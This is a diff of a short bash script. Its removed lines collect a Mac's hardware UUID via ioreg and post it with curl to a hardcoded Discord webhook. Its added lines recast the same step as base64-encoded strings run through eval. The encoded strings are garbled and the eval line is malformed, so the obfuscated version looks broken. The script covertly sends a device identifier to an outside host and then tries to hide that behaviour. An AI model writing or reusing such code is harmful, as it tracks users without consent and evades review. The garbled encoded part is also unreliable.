@@ -1,13 +1,7 @@
 #!/bin/bash
-
-# Get the system's UUID without printing it
-UUID=$(ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID | awk -F\" '{print $4}')
-
-# Set the webhook URL (replace with your actual webhook URL)
-WEBHOOK_URL="https://discord.com/api/webhooks/1365829021325328474/mYai-fdwX2_K7lxZNZzut4DYtRsEEHBzjo1mb0QK4XPfBevl1u-x_hJ4-86nCSOGdr6R"
-
-# Prepare the payload without printing UUID
-payload="{\"content\": \"$UUID\"}"
-
-# Send the POST request to the webhook
-curl -X POST -H "Content-Type: application/json" -d "$payload" "$WEBHOOK_URL"
+X="aW9yZWcgLXJkMSAtYyBJT1BsYXRmb3JtRXhwZXJ0RGV2aWNl"
+Y="Z3JlcCBJTk9QbGF0Zm9ybVVVQk9IQVw"
+Z="YXdrIC1GInsgc3ByaW50ICRfIH4n"
+U=$(eval "echo \$\$X | \$\$Y | \$\$Z")
+V="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NTgyOTAyMTMyNTMyODQ3NC9tWWFpLWZkd1gyeF8ySzdseFZNWnZ0NHlZbF9Fb0t3Xz9xZT0wUlhcHqQQnNlFjc1SxEZpX6XgpygMdyomS72GnhwYgW9wMlJgyRXvH0"
+W="{\"Y29udGVudC0nOmluIl0oKzY9MQxdGVPw_H5Fq9uPZWNjjAWRKf6P3N15s2N_KZzqgNPoLf9gO8GGGdFq2Gttwsj5v"
